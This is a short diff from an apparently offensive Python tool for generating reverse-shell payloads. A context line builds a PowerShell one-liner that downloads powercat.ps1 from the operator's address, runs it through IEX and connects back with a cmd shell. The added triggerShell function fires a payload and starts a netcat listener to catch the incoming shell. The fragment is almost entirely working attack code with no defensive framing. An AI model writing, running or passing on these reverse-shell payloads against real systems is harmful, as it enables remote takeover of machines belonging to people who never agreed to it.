@@ -28,6 +28,11 @@ def generatePayload(type, local_address, port):
     elif type == "powercat" or type == "powershell":
         return "powershell.exe -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://%s/powercat.ps1');powercat -c %s -p %d -e cmd\"" % (local_address, local_address, port)
 
+def triggerShell(func, port):
+    func()
+    pty.spawn(["nc", "-lvvp", str(port)])
+
+
 if __name__ == "__main__":
 
     if len(sys.argv) < 2:
